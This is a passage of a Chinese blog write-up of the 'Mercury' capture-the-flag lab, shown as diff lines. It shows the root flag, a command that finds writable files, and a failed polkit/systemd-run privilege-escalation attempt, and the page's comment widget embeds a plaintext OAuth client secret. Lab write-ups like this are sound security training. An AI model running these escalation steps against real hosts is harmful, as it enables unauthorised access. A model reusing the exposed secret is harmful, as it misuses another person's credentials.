class="hljs-comment">##////////@@@@@@@@@@@@@@@@@@@@</span><br>@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@<br>@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@<br>@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@<br>@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@<br>@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@<br>@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@<br>@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@<br>@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@<br>@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@<br>@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@<br>@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@<br>@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@<br>@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@<br>@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@<br>@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@<br>@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@<br>@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br><br>Congratulations on completing Mercury!!!<br>If you have any feedback please contact me at SirFlash@protonmail.com<br>[root_flag_69426d9fda579afbffd9c2d47ca31d90]<br></code></pre></td></tr></table></figure>
+
+<p>到这里，提权结束</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/usr/share$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/sys*&quot;</span> -not -path <span class="hljs-string">&quot;/proc*&quot;</span> 2&gt;/dev/null<br>/home/linuxmaster/.bashrc<br>/home/linuxmaster/.bash_logout<br>/home/linuxmaster/.profile<br>/home/linuxmaster/.cache/motd.legal-displayed<br></code></pre></td></tr></table></figure>
+
+<h3 id="polkit-agent-helper-1-提权"><a href="#polkit-agent-helper-1-提权" class="headerlink" title="polkit-agent-helper-1 提权"></a>polkit-agent-helper-1 提权</h3><p>尝试上次红队笔记用的 helper 提权，但是授权用户是 mercury，因此无法直接提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/usr/share$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                <br>Authenticating as: mercury<br>Password: <br>polkit-agent-helper-1: pam_authenticate failed: Authentication failure<br>==== AUTHENTICATION FAILED ===<br>Failed to start transient service unit: Access denied<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>THE PLANETS MERCURY</div>
+      <div>https://i3eg1nner.github.io/2023/06/b0b39d4ac246.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/1d78c8deaa4a.html" title="NYX1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NYX1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/9dfa91b67af1.html" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'a3f9c64c6d4c118cf64a432685de3f90'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
